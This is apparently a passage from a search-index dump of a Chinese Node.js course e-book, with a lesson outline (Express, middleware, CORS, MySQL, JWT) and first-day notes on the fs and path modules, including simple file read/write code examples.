\u63a5\u53e3\u9879\u76ee\u5f00\u53d1\u7b49\u540e\u7aef\u5185\u5bb9\uff0c\u62d3\u5bbd\u4e86\u5b66\u751f\u7684\u77e5\u8bc6\u9762\uff0c\u4e3a\u524d\u7aef\u5b66\u751f\u6784\u5efa\u4e86\u524d\u540e\u7aef\u5b8c\u6574\u7684\u77e5\u8bc6\u4f53\u7cfb\uff0c\u52a9\u529b\u5b66\u751f\u66f4\u597d\u5730\u53d1\u5c55\u3002</p> <p>\u8bfe\u7a0b\u76ee\u5f55</p>"},{"location":"ebook-heima-nodejs/00/#_1","title":"\u7b2c\u56db\u5929","text":"<p>P42</p> <p>01.\u8def\u7531-\u521d\u8bc6express\u4e2d\u7684\u8def\u7531</p> <p>13:06</p> <p>P43</p> <p>02.\u8def\u7531-\u8def\u7531\u7684\u6a21\u5757\u5316</p> <p>16:08</p> <p>P44</p> <p>03.\u4e2d\u95f4\u4ef6-\u4e2d\u95f4\u4ef6\u7684\u6982\u5ff5\u4e0e\u683c\u5f0f</p> <p>08:14</p> <p>P45</p> <p>04.\u4e2d\u95f4\u4ef6-\u5168\u5c40\u751f\u6548\u7684\u4e2d\u95f4\u4ef6</p> <p>25:00</p> <p>P46</p> <p>05.\u4e2d\u95f4\u4ef6-\u5c40\u90e8\u751f\u6548\u7684\u4e2d\u95f4\u4ef6</p> <p>09:56</p> <p>P47</p> <p>06.\u4e2d\u95f4\u4ef6-\u4e2d\u95f4\u4ef6\u76845\u4e2a\u6ce8\u610f\u4e8b\u9879</p> <p>04:06</p> <p>P48</p> <p>07.\u4e2d\u95f4\u4ef6-\u4e2d\u95f4\u4ef6\u7684\u5206\u7c7b</p> <p>39:46</p> <p>P49</p> <p>08.\u4e2d\u95f4\u4ef6-\u81ea\u5b9a\u4e49\u4e2d\u95f4\u4ef6</p> <p>22:31</p> <p>P50</p> <p>09.\u7f16\u5199\u63a5\u53e3-\u521b\u5efa\u57fa\u672c\u7684\u670d\u52a1\u5668&amp;\u521b\u5efaAPI\u8def\u7531\u6a21\u5757</p> <p>06:17</p> <p>P51</p> <p>10.\u7f16\u5199\u63a5\u53e3-\u7f16\u5199GET\u63a5\u53e3</p> <p>06:08</p> <p>P52</p> <p>11.\u7f16\u5199\u63a5\u53e3-\u7f16\u5199POST\u63a5\u53e3</p> <p>05:45</p> <p>P53</p> <p>12.\u7f16\u5199\u63a5\u53e3-\u57fa\u4e8ecors\u89e3\u51b3\u63a5\u53e3\u8de8\u57df\u95ee\u9898</p> <p>11:59</p> <p>P54</p> <p>13.\u8de8\u57df-cors\u76f8\u5173\u7684\u4e09\u4e2a\u54cd\u5e94\u5934</p> <p>05:36</p> <p>P55</p> <p>14.\u8de8\u57df-cors\u7684\u7b80\u5355\u8bf7\u6c42\u4e0e\u9884\u68c0\u8bf7\u6c42</p> <p>08:37</p> <p>P56</p> <p>15.\u8de8\u57df-\u7f16\u5199jsonp\u63a5\u53e3</p> <p>12:59</p> <p>P57</p>"},{"location":"ebook-heima-nodejs/00/#_2","title":"\u7b2c\u4e94\u5929","text":"<p>\u5b66\u4e60\u76ee\u6807</p> <p>01:27</p> <p>P58</p> <p>01.\u6570\u636e\u5e93\u7684\u57fa\u672c\u6982\u5ff5</p> <p>14:59</p> <p>P59</p> <p>02.\u5b89\u88c5MySQL\u6570\u636e\u5e93</p> <p>17:36</p> <p>P60</p> <p>03.MySQL-Workbench\u7684\u57fa\u672c\u7528\u6cd5</p> <p>07:14</p> <p>P61</p> <p>04.\u521b\u5efa\u6570\u636e\u5e93\u548c\u8868</p> <p>27:41</p> <p>P62</p> <p>05.\u4e86\u89e3\u4ec0\u4e48\u662fSQL</p> <p>04:12</p> <p>P63</p> <p>06.SQL\u8bed\u53e5-select\u3001insert\u3001update\u3001delete</p> <p>22:16</p> <p>P64</p> <p>07.SQL\u8bed\u53e5-where\u5b50\u53e5\u3001and\u548cor\u8fd0\u7b97\u7b26</p> <p>11:57</p> <p>P65</p> <p>08.SQL\u8bed\u53e5-\u6392\u5e8f</p> <p>09:23</p> <p>P66</p> <p>09.SQL\u8bed\u53e5-count\u51fd\u6570\u548cas\u5173\u952e\u5b57</p> <p>04:55</p> <p>P67</p> <p>10.SQL\u8bed\u53e5-\u6f14\u793a\u5982\u4f55\u4fdd\u5b58\u548c\u6253\u5f00.sql\u7684\u6587\u4ef6</p> <p>01:36</p> <p>P68</p> <p>11.mysql\u6a21\u5757-\u5b89\u88c5\u5e76\u914d\u7f6emysql\u6a21\u5757</p> <p>11:21</p> <p>P69</p> <p>12.mysql\u6a21\u5757-\u67e5\u8be2\u548c\u63d2\u5165\u6570\u636e</p> <p>21:47</p> <p>P70</p> <p>13.mysql\u6a21\u5757-\u66f4\u65b0\u548c\u5220\u9664\u6570\u636e</p> <p>19:41</p>"},{"location":"ebook-heima-nodejs/00/#_3","title":"\u7b2c\u516d\u5929","text":"<p>P71</p> <p>01.web\u5f00\u53d1\u6a21\u5f0f</p> <p>09:14</p> <p>P72</p> <p>02.\u8eab\u4efd\u8ba4\u8bc1\u7684\u6982\u5ff5</p> <p>03:47</p> <p>P73</p> <p>03.session\u539f\u7406</p> <p>24:38</p> <p>P74</p> <p>04.session\u4e2d\u95f4\u4ef6\u7684\u4f7f\u7528</p> <p>17:57</p> <p>P75</p> <p>05.jwt-\u4e86\u89e3token\u7684\u539f\u7406</p> <p>09:44</p> <p>P76</p> <p>06.jwt-\u5728express\u4e2d\u751f\u6210token</p> <p>28:22</p> <p>P77</p> <p>07.\u9879\u76ee-\u521d\u59cb\u5316\u9879\u76ee</p> <p>08:06</p> <p>P78</p> <p>08.\u9879\u76ee-\u521d\u59cb\u5316\u8def\u7531\u6a21\u5757</p> <p>13:25</p> <p>P79</p> <p>09.\u9879\u76ee-\u5f00\u53d1\u6ce8\u518c\u7528\u6237\u7684API\u63a5\u53e3</p> <p>37:19</p> <p>P80</p> <p>10.\u9879\u76ee-\u4ee3\u7801\u4f18\u5316</p> <p>41:36</p>"},{"location":"ebook-heima-nodejs/00/#_4","title":"\u7b2c\u4e03\u5929","text":"<p>P81</p> <p>01.\u9879\u76ee-\u5f00\u53d1\u767b\u5f55\u7684API\u63a5\u53e3</p> <p>15:54</p> <p>P82</p> <p>02.\u9879\u76ee-token\u7684\u751f\u6210\u4e0e\u9a8c\u8bc1</p> <p>21:13</p> <p>P83</p> <p>03.\u9879\u76ee-\u5f00\u53d1\u83b7\u53d6\u7528\u6237\u7684\u57fa\u672c\u4fe1\u606f\u7684\u63a5\u53e3</p> <p>17:41</p> <p>P84</p> <p>04.\u9879\u76ee-\u5f00\u53d1\u66f4\u65b0\u7528\u6237\u7684\u57fa\u672c\u4fe1\u606f\u7684\u63a5\u53e3</p> <p>24:48</p> <p>P85</p> <p>05.\u9879\u76ee-\u5f00\u53d1\u91cd\u7f6e\u5bc6\u7801\u7684\u63a5\u53e3</p> <p>25:19</p> <p>P86</p> <p>06.\u9879\u76ee-\u5f00\u53d1\u66f4\u6362\u5934\u50cf\u7684\u63a5\u53e3</p> <p>13:38</p> <p>P87</p> <p>07.\u603b\u7ed3</p> <p>01:40</p>"},{"location":"ebook-heima-nodejs/00/#_5","title":"\u7b2c\u516b\u5929","text":"<p>P88</p> <p>01.\u65b0\u5efaev_article_cate\u6570\u636e\u8868</p> <p>05:49</p> <p>P89</p> <p>02.\u9879\u76ee-\u5f00\u53d1\u83b7\u53d6\u6587\u7ae0\u5206\u7c7b\u5217\u8868\u7684\u63a5\u53e3</p> <p>17:36</p> <p>P90</p> <p>03.\u9879\u76ee-\u5f00\u53d1\u65b0\u589e\u6587\u7ae0\u5206\u7c7b\u7684\u63a5\u53e3</p> <p>28:18</p> <p>P91</p> <p>04.\u9879\u76ee-\u5f00\u53d1\u6839\u636eid\u5220\u9664\u6587\u7ae0\u5206\u7c7b\u7684\u63a5\u53e3</p> <p>14:49</p> <p>P92</p> <p>05.\u9879\u76ee-\u5f00\u53d1\u6839\u636eid\u83b7\u53d6\u6587\u7ae0\u5206\u7c7b\u7684\u63a5\u53e3</p> <p>13:24</p> <p>P93</p> <p>06.\u9879\u76ee-\u5f00\u53d1\u6839\u636eid\u66f4\u65b0\u6587\u7ae0\u5206\u7c7b\u7684\u63a5\u53e3</p> <p>23:35</p> <p>P94</p> <p>07.\u65b0\u5efaev_articles\u6587\u7ae0\u8868</p> <p>07:24</p> <p>P95</p> <p>08.\u9879\u76ee-\u521d\u59cb\u5316\u53d1\u5e03\u6587\u7ae0\u7684\u8def\u7531\u6a21\u5757</p> <p>09:18</p> <p>P96</p> <p>09.\u6f14\u793aAPI\u63a5\u53e3\u7684\u4f7f\u7528</p> <p>02:34</p>"},{"location":"ebook-heima-nodejs/01/","title":"01","text":""},{"location":"ebook-heima-nodejs/01/#node","title":"\u7b2c\u4e00\u5929 \u521d\u8bc6 Node","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 8046  \u9605\u8bfb17\u5206\u949f</p>"},{"location":"ebook-heima-nodejs/01/#00","title":"00.\u5b66\u4e60\u76ee\u6807","text":"<p>Nodejs \u662f\u4ec0\u4e48\uff0c\u53ef\u4ee5\u505a\u4ec0\u4e48\uff0c\u7ec4\u6210\u90e8\u5206</p> <p>\u5e38\u89c1\u6a21\u5757\u529f\u80fd\uff1afs \u8bfb\u5199\u64cd\u4f5c\u6587\u4ef6\uff1bpath \u5904\u7406\u8def\u5f84\uff1bhttp \u5b9e\u73b0\u57fa\u672c web \u670d\u52a1\u5668</p>"},{"location":"ebook-heima-nodejs/01/#01javascript","title":"01.\u6d4f\u89c8\u5668\u4e2d\u7684JavaScript\u8fd0\u884c\u73af\u5883","text":"<p>\u6d4f\u89c8\u5668\uff1a\u53ef\u4ee5\u89e3\u6790 JS \u8bed\u6cd5\uff0c\u5305\u62ec\u6838\u5fc3\u8bed\u6cd5\uff08\u53d8\u91cf\u51fd\u6570\u6570\u636e\u7c7b\u578b\uff09+ webAPI\uff08DOM+ BOM\uff09</p> <p>\u6bcf\u4e2a\u6d4f\u89c8\u5668\u5185\u7f6e\u4e86 DOM BOM \u7684 API\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u5bf9\u5e94\u7684\u65b9\u6cd5</p> <p>\u8fd0\u884c\u73af\u5883\uff1a\u4ee3\u7801\u6b63\u5e38\u8fd0\u884c\u9700\u8981\u7684\u5fc5\u8981\u73af\u5883\uff1bV8 \u5f15\u64ce\u8d1f\u8d23\u89e3\u6790\u548c\u6267\u884c JS \u4ee3\u7801\u3002\u6d4f\u89c8\u5668\u8fd0\u884c\u73af\u5883\u63d0\u4f9b\u4e86\u5185\u7f6e API\uff0c\u6240\u4ee5API\u53ea\u80fd\u5728\u6d4f\u89c8\u5668\u4e2d\u8c03\u7528\uff0c\u5728 nodeJS \u4e2d\u6ca1\u6709\u3002</p>"},{"location":"ebook-heima-nodejs/01/#02-nodejs","title":"02.\u4ec0\u4e48\u662f Node.js","text":"<p>NodeJS \u4e2d\u7684 JS = \u57fa\u672c\u7684 JS \u8bed\u6cd5 + \u5185\u7f6e API\uff08fs path http \u7b49\uff09</p> <p>\u6d4f\u89c8\u5668\u662fJS\u6267\u884c\u7684\u524d\u7aef\u8fd0\u884c\u73af\u5883\uff1bNodeJS\u662fJS\u6267\u884c\u7684\u540e\u7aef\u8fd0\u884c\u73af\u5883\uff0c\u6240\u4ee5nodeJS \u4e2d\u65e0\u6cd5\u4f7f\u7528 BOM DOM \u7b49\u6d4f\u89c8\u5668\u5185\u7f6eAPI\u8bed\u6cd5</p> <p>\u7528\u9014\uff1aNodeJS \u63d0\u4f9b\u4e86\u5e95\u5c42API\u7684\u8c03\u7528\uff0c\u5bf9\u5e94\u7684\u5c31\u662f\u6d4f\u89c8\u5668\u3002\u5177\u4f53\u7684\u4e1a\u52a1\u903b\u8f91\u4e3b\u8981\u7531\u5404\u79cd\u6846\u67b6\u7684\u529f\u80fd\u5b8c\u6210\uff1a\u4f8b\u5982\u4f7f\u7528 express koa egg \u6784\u5efaweb\u540e\u7aef\u5e94\u7528\uff1b\u4f7f\u7528 electron \u6784\u5efa APP\uff08\u8de8\u5e73\u53f0\u4f7f\u7528\uff09\u7b49nodeJS \u53ef\u4ee5\u4f7f\u7528\u539f\u751f\u7684 API \u5b8c\u6210\u4e1a\u52a1\uff0c\u7c7b\u4f3c\u6d4f\u89c8\u5668\u76f4\u63a5\u66f4\u6539DOM\uff0c\u5b9e\u9645\u4e0a\u590d\u6742\u7684\u529f\u80fd\u4f7f\u7528\u6846\u67b6\u6027\u80fd\u66f4\u597d\u3002</p> <p>\u5982\u4f55\u5b66\u4e60nodejs\uff1aJS\u57fa\u672c\u8bed\u6cd5 + \u5185\u7f6eAPI\uff08fs http\uff09+ \u5e38\u7528\u7b2c\u4e09\u653e\u6846\u67b6\uff08experss mysql\uff09</p>"},{"location":"ebook-heima-nodejs/01/#03nodejs","title":"03.\u5b89\u88c5Node.js","text":"<p>\u4e0d\u540c\u64cd\u4f5c\u7cfb\u7edf\u4e0b\u8f7d\u4e0d\u540c\u7684\u5b89\u88c5\u5305\u3002\u7248\u672c\u53f7\u4e2d\u5076\u6570\u7684\u662f\u7a33\u5b9a\u7248\uff0c\u5947\u6570\u7684\u662f\u6d4b\u8bd5\u7248\uff0c\u4f01\u4e1a\u7ea7\u4f7f\u7528\u5076\u6570\u7248\u672c\u3002</p>"},{"location":"ebook-heima-nodejs/01/#04nodejs","title":"04.\u4f7f\u7528Node\u8fd0\u884cJS\u4ee3\u7801","text":"<p>\u76f4\u63a5\u4f7f\u7528 node + \u6587\u4ef6\u8def\u5f84\u5373\u53ef\u8fd0\u884c\uff0c\u6216\u8005\u8f93\u5165 node \u8fdb\u5165\u4ea4\u4e92\u5f0f\u754c\u9762\u4e2d\u5355\u884c\u8f93\u5165JS\u4ee3\u7801\u3002</p>"},{"location":"ebook-heima-nodejs/01/#05fs-","title":"05.fs-\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9","text":"<p>fs \u662f\u6587\u4ef6\u64cd\u4f5c</p> <pre><code>const fs = require('fs');\n\nfs.readFile(path, options, callback);\nfs.writeFile(path, content, [option], callback);\n</code></pre> <ul> <li>Path \u6587\u4ef6\u7684\u8def\u5f84</li> <li>options\uff0c\u53ef\u9009\uff0c\u901a\u5e38\u8868\u793a\u6587\u4ef6\u7f16\u7801\u683c\u5f0f utf8</li> <li>content \u6587\u4ef6\u5185\u5bb9\uff08\u901a\u5e38\u662f\u5b57\u7b26\u4e32\u6216\u8005array buffer\uff09</li> <li>callback \u5f02\u6b65\u64cd\u4f5c\u6587\u4ef6\u540e\u7684\u56de\u8c03\u51fd\u6570\uff08\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u9519\u8bef\u5bf9\u8c61\uff0c\u7b2c\u4e8c\u4e2a\u662f\u64cd\u4f5c\u7684\u7ed3\u679c\uff09\u5982\u679c\u8bfb\u53d6\u6210\u529f\uff0cerr \u5bf9\u8c61\u662f null\uff0cdatastring \u662f\u8bfb\u53d6\u7684\u6587\u4ef6\u5185\u5bb9\uff1b\u5982\u679c\u8bfb\u53d6\u5931\u8d25\uff0cerr \u662f\u9519\u8bef\u5bf9\u8c61\uff0cdataString \u662f undefined</li> </ul> <p>\u5b9e\u4f8b</p> <pre><code>const fs = require('fs');\n\nfs.readFile('./1.txt', 'utf8', function (err, dataStr) {\n  if (err) {\n    console.log(err.message);\n    return;\n  }\n  console.log(dataStr);\n});\n</code></pre>"},{"location":"ebook-heima-nodejs/01/#06fs-","title":"06.fs-\u5199\u5165\u6587\u4ef6\u5185\u5bb9","text":"<pre><code>const fs = require('fs');\n\nfs.writeFile('./1.txt', 'hello world', function (err) {\n  if (err) {\n    console.log(err.message);\n  }\n});\n</code></pre>"},{"location":"ebook-heima-nodejs/01/#07fs-","title":"07.fs-\u6574\u7406\u6210\u7ee9\u7684\u6848\u4f8b","text":"<p>\u5148\u5206\u6790\u7a0b\u5e8f\u7684\u601d\u8def\uff0c\u7136\u540e\u518d\u5199\u4ee3\u7801</p> <p>\u95ee\u9898\uff1a\u4e00\u4e2a\u6210\u7ee9txt\u6587\u4ef6\u4e2d\uff0c\u6240\u6709\u7684\u5206\u5272\u4e0d\u6b63\u786e\uff0c\u9700\u8981\u6b63\u786e\u7684\u6362\u884c\u548c\u7b26\u53f7\u3002</p> <ol> <li>\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9</li> <li>\u89c4\u8303\u5316\u683c\u5f0f</li> <li>\u5199\u5165\u65b0\u6587\u4ef6</li> </ol> <pre><code>const fs = require('fs');\n\nfs.readFile('./result.txt', 'utf8', function(err, dataStr) {\n  if (err) {\n    console.log(err.message);\n    return;\n  }\n  const arr = dataStr.split(' ');\n  const arrNew = arr.map(item =&gt; {\n    return item.replace('=', ':');\n  });\n  const newRes = arrNew.join('\\n');\n  fs.writeFile('./result-new.txt', newRes, function(err, dataStr) {\n    if (err) {\n      console.log(err.message);\n      return;\n    }\n    console.log('write file success');\n  })\n})\n</code></pre>"},{"location":"ebook-heima-nodejs/01/#08fs-","title":"08.fs-\u5904\u7406\u8def\u5f84\u95ee\u9898","text":"<p>\u76f8\u5bf9\u8def\u5f84\u7684\u95ee\u9898\uff1a\u4e0a\u9762\u7684\u6848\u4f8b\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528\u62fc\u63a5\u5b57\u7b26\u4e32\u7684\u65b9\u5f0f\uff0c\u7ec4\u6210\u9700\u8981\u8bfb\u53d6\u5199\u5165\u7684\u6587\u4ef6\u8def\u5f84\u3002\u5982\u679c\u5728 cmd \u4e2d\u53e6\u4e00\u4e2a\u8def\u5f84\u4e2d\u6267\u884c\u811a\u672c\uff0c\u90a3\u4e48\u76f8\u5bf9\u8def\u5f84\u53ef\u80fd\u4e0d\u6b63\u786e\uff0c\u65e0\u6cd5\u6267\u884c\uff0c\u6240\u4ee5\u4e0d\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84\u3002</p> <p>\u7edd\u5bf9\u8def\u5f84\u7684\u95ee\u9898\uff1a\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84\uff0c\u53ef\u4ee5\u5728\u5404\u79cd\u8def\u5f84\u4e0b\u6267\u884c\u6b63\u786e\u3002\u4f46\u662f\u5f53\u67d0\u4e2a\u6587\u4ef6\u540d\u66f4\u6539\u540e\uff0c\u7edd\u5bf9\u8def\u5f84\u4e0d\u4f1a\u81ea\u52a8\u53d8\u5316\uff0c\u8fd9\u6837\u4ee3\u7801\u53ef\u7ef4\u62a4\u6027\u4e0d\u597d\u3002\u4ece\u4e00\u4e2a\u673a\u5668\u5230\u53e6\u4e00\u4e2a\u673a\u5668\uff0c\u4ee3\u7801\u5b9e\u7528\u6027\u5f88\u5dee\uff0c\u6240\u4ee5\u4e0d\u9002\u7528\u7edd\u5bf9\u8def\u5f84\u3002</p> <p>\u6240\u4ee5\u6211\u4eec\u4f7f\u7528 __dirname \u8868\u793a\u5f53\u524d\u6587\u4ef6\u7684\u8def\u5f84\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u4e0a\u9762\u7684\u95ee\u9898</p>"},{"location":"ebook-heima-nodejs/01/#09path-path","title":"09.path-\u4f7f\u7528path\u6a21\u5757\u5904\u7406\u8def\u5f84","text":"<p>\u56e0\u4e3a\u4e0a\u9762\u7684\u95ee\u9898\uff0cpath \u6a21\u5757\u53ef\u4ee5\u5904\u7406\u5404\u79cd\u8def\u5f84\u95ee\u9898\uff0c\u4ee5\u540e\u8def\u5f84\u62fc\u63a5\u7684\u64cd\u4f5c\u5fc5\u987b\u4f7f\u7528 path\u3002</p> <ul> <li>path.join() \u5c06\u591a\u4e2a\u8def\u5f84\u7247\u6bb5\uff0c\u62fc\u63a5\u6210\u4e00\u4e2a\u5b8c\u6574\u7684\u5b57\u7b26\u4e32\uff08\u5305\u62ec\u5404\u79cd\u76f8\u5bf9\u7edd\u5bf9\u8def\u5f84\uff09</li> <li>path.basename(path, [ext]) \u4ece\u8def\u5f84\u5b57\u7b26\u4e32\u4e2d\u89e3\u6790\u6587\u4ef6\u540d, ext \u662f\u6587\u4ef6\u6269\u5c55\u540d\uff0c\u53ef\u9009</li> <li>path.extname(path) \u83b7\u53d6\u8def\u5f84\u4e2d\u6269\u5c55\u540d\u90e8\u5206\uff0c\u8fd4\u56de\u5b57\u7b26\u4e32</li> </ul> <p>\u5b9e\u4f8b</p> <pre><code>const path = require('path');\n\nconsole.log(path.join('/a', '/b/c', '../../', './d', 'e')); // /a/d/e\nconsole.log(path.join(__dirname), './1.txt');\n\npath.basename('./test/1.txt'); // 1.txt\npath.basename('./test/1.txt', '.txt'); // 1 \u7b2c\u4e8c\u4e2a\u53c2\u6570\u4f1a\u53bb\u6389\u540e\u7f00\u540d\npath.extname('./test/1.txt'); // .txt \u8fd4\u56de\u503c\u4e2d\u5305\u62ec\u540e\u7f00\u540d\u548c\u70b9\n</code></pre>"},{"location":"ebook-heima-nodejs/01/#10-","title":"10.\u65f6\u949f\u6848\u4f8b-\u5206\u6790\u9700\u6c42&amp;\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9","text":"<p>\u9700\u6c42\uff1a\u6709\u4e00\u4e2a\u524d\u7aef\u6587\u4ef6 HTML\uff0c\u5176\u4e2d\u5305\u62ec\u4e86 css \u548c JS \u6807\u7b7e\u3002\u6211\u4eec\u9700\u8981\u628a css \u548c JS \u90e8\u5206\u5355\u72ec\u5199\u6210\u5916\u90e8\u6587\u4ef6\uff0c\u5e76\u5bfc\u5165\u5230 HTML \u6587\u4ef6\u4e2d\uff0c\u539f\u6765\u7684\u529f\u80fd\u6b63\u5e38\u4f7f\u7528\u3002</p> <p>\u9ed8\u8ba4\u53ea\u6709\u4e00\u4e2a style \u548c script \u6807\u7b7e\u3002</p> <p>\u7b97\u6cd5\uff1a</p> <ol> <li>\u4f7f\u7528 fs \u8bfb\u53d6 HTML \u6587\u4ef6</li> <li>\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d style \u548c script \u6807\u7b7e\uff0c\u83b7\u53d6 css \u548c JS \u90e8\u5206</li> <li>\u4f7f\u7528 fs \u5199\u5165 index.css index.js index.html \u6587\u4ef6</li> </ol> <p>\u4ee3\u7801\u5b9e\u73b0</p> <pre><code>const fs = require('fs');\nconst path = require('path');\n\nconst regStyle = /&lt;style&gt;[\\s\\S]*&lt;\\/style&gt;/;\nconst regScript = /&lt;script&gt;[\\s\\S]*&lt;\\/script&gt;/;\n// \u6ce8\uff1a\\s \u8868\u793a\u7a7a\u767d\u5b57\u7b26\uff0c\\S \u8868\u793a\u975e\u7a7a\u767d\u5b57\u7b26\uff0c[\\s\\S] \u8868\u793a\u4efb\u610f\u5b57\u7b26\uff0c* \u8868\u793a\u4efb\u610f\u591a\u4e2a\n\nfs.readFile(path.join(__dirname, './index.html'), 'utf8', (err, dataStr) =&gt; {\n  if (err) {\n    console.log(err.message);\n    return;\n  }\n  resolveCSS(dataStr);\n  resolveJS(dataStr);\n  resolveHTML(dataStr);\n});\n</code></pre>"},{"location":"ebook-heima-nodejs/01/#11-cssjshtml","title":"11.\u65f6\u949f\u6848\u4f8b-\u5904\u7406CSS\u3001JS\u3001HTML","text":"<p>\u5904\u7406 css\uff0c\u628a css \u5199\u5165\u5916\u90e8\u6587\u4ef6 index.css </p> <p><pre><code>function resolveCSS(htmlStr) {\n  const res = regStyle.exec(htmlStr)[0];\n  const newCSS = res.replace('&lt;style&gt;', '').replace('&lt;/style&gt;', '');\n  fs.writeFile(path.join(__dirname, './index.css'), newCSS, (err) =&gt; {\n    if (err) {\n      logger.err(err.message);\n      return \n    }\n    console.log('add css file success')\n  })\n}\n</code></pre> exec \u8bf4\u660e <pre><code>// \u9644\u5f55\uff1aReg.exec(string) \u68c0\u7d22\u5b57\u7b26\u4e32\u4e2d\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u5339\u914d\n// \u8fd4\u56de\u503c arr\uff1a\u4e00\u4e2a\u6570\u7ec4\uff0c\u5982\u679c\u4e3a\u627e\u5230\u8fd4\u56de null\n// arr[0] \u4e0e\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u7684\u6587\u672c\uff08\u5982\u679c\u6709\uff09\n// arr[1] \u4e0e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u7b2c1\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d\u7684\u6587\u672c\uff08\u5982\u679c\u6709\uff09\n// arr[2] \u4e0e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u7b2c2\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d\u7684\u6587\u672c\uff08\u5982\u679c\u6709\uff09\uff0c\u4ee5\u6b64\u7c7b\u63a8\n// arr.index \u5339\u914d\u6587\u672c\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u7684\u4f4d\u7f6e\n// arr.input \u662f\u88ab\u68c0\u7d22\u7684\u5b57\u7b26\u4e32 string\n// \u4e00\u822c\u60c5\u51b5\u4e0b\uff08\u975e\u5168\u5c40\u7684Regexp\uff09 Regexp.exec(string) \u548c String.match(regexp) \u8fd4\u56de\u503c\u76f8\u540c\n</code></pre></p> <p>\u5904\u7406JS\uff0c\u628a js \u5199\u5165\u5916\u90e8\u6587\u4ef6 index.js</p> <pre><code>function resolveJS(htmlStr) {\n  const res = regScript.exec(htmlStr)[0];\n  const newJS = res.replace('&lt;script&gt;', '').replace('&lt;/script&gt;', '');\n  fs.writeFile(path.join(__dirname, './index.js'), newJS, (err) =&gt; {\n    if (err) {\n      logger.err(err.maeeage);\n      return;\n    }\n    console.log('write js success');\n  })\n}\n</code></pre> <p>\u5904\u7406 HTML\uff0c\u53bb\u6389\u539f\u6765\u7684 style \u548c js \u90e8\u5206\uff0c\u7136\u540e\u5f15\u5165 link \u548c script \u65b0\u6807\u7b7e</p> <pre><code>function resolveHTML(htmlStr) {\n  const newHTML = htmlStr\n    .replace(regCSS, '&lt;link ref=\"stylesheet\" href=\"./index.css\"&gt;&lt;/link&gt;')\n    .replace(regScript, '&lt;script src=\"./index.js\"&gt;&lt;/script&gt;');\n  fs.writeFile(path.join(__dirname, './index.html'), newHTML, (err) =&gt; {\n    if (err) {\n      logger.error(err.message);\n      return;\n    }\n    console.log('write html success');\n  })\n}\n</code></pre>"},{"location":"ebook-heima-nodejs/01/#12-","title":"12.\u65f6\u949f\u6848\u4f8b-\u65f6\u949f\u6848\u4f8b\u7684\u4e24\u4e2a\u6ce8\u610f\u70b9","text":"<p>fs.writeFile() \u53ea\u80fd\u521b\u5efa\u6587\u4ef6\uff0c\u4e0d\u80fd\u521b\u5efa\u6587\u4ef6\u5939\uff08\u521b\u5efa\u8def\u5f84\uff09\uff0c\u6240\u4ee5\u901a\u5e38\u5148\u68c0\u67e5\u8def\u5f84\u662f\u5426\u5b58\u5728\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u5148\u521b\u5efa\u6587\u4ef6\u5939\uff0c\u7136\u540e\u518d\u5199\u5165\u6587\u4ef6\u3002</p> <p>fs.writeFile() \u9ed8\u8ba4\u4f1a\u8986\u76d6\u6587\u4ef6\u5185\u5bb9\uff08\u65b0\u7684\u5185\u5bb9\u628a\u65e7\u7684\u5185\u5bb9\u8986\u76d6\uff09\uff0c\u5982\u679c\u8bbe\u7f6e\u8ffd\u52a0\u6a21\u5f0f\uff0c\u9700\u8981\u53c2\u9605 options \u7684\u5177\u4f53\u914d\u7f6e\u3002</p>"},{"location":"ebook-heima-nodejs/02/","title":"02","text":""},{"location":"ebook-heima-nodejs/02/#_1","title":"\u7b2c\u4e8c\u5929","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 8908  \u9605\u8bfb18\u5206\u949f</p>"},{"location":"ebook-heima-nodejs/02/#01http-http","title":"01.http-\u7406\u89e3http\u6a21\u5757\u7684\u6982\u5ff5\u53ca\u4f5c\u7528","text":"<p>\u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\uff1a\u7f51\u7edc\u8282\u70b9\u4e2d\uff0c\u8d1f\u8d23\u6d88\u8d39\u8d44\u6e90\u7684\u7535\u8111\u5c31\u662f\u5ba2\u6237\u7aef\uff0c\u8d1f\u8d23\u5bf9\u5916\u63d0\u4f9b\u7f51\u7edc\u8d44\u6e90\u7684\u7535\u8111\u53eb\u505a\u670d\u52a1\u5668\u3002\u4e00\u4e2a\u4e3b\u673a\u53ef\u4ee5\u540c\u65f6\u63d0\u4f9b\u670d\u52a1\u5e76\u4e14\u6d88\u8d39\u8d44\u6e90\u3002</p> <p>\u670d\u52a1\u5668\u548c\u666e\u901a\u7535\u8111\u7684\u533a\u522b\uff1a\u5b89\u88c5\u4e86 web \u670d\u52a1\u5668\u8f6f\u4ef6\uff08Apache\u7b49\uff09\uff0c\u5b89\u88c5\u540e\uff0c\u63d0\u4f9b\u4e86\u670d\u52a1\u5c31\u662f\u670d\u52a1\u5668</p> <p>http \u6a21\u5757\u662f\u5b98\u65b9\u63d0\u4f9b\u7684\uff0c\u521b\u5efa web \u670d\u52a1\u5668\u7684\u6a21\u5757\u3002nodejs \u4e2d\u4e0d\u9700\u8981\u5355\u72ec\u7684 web \u670d\u52a1\u5668\u8f6f\u4ef6 apache\uff0c\u76f4\u63a5\u4f7f\u7528\u5373\u53ef\u521b\u5efa\u670d\u52a1\u5668\uff0c\u5e76\u5bf9\u5916\u63d0\u4f9b web \u670d\u52a1\u3002</p>"},{"location":"ebook-heima-nodejs/02/#02http-","title":"02.http-\u670d\u52a1\u5668\u76f8\u5173\u7684\u6982\u5ff5","text":"<p>IP: 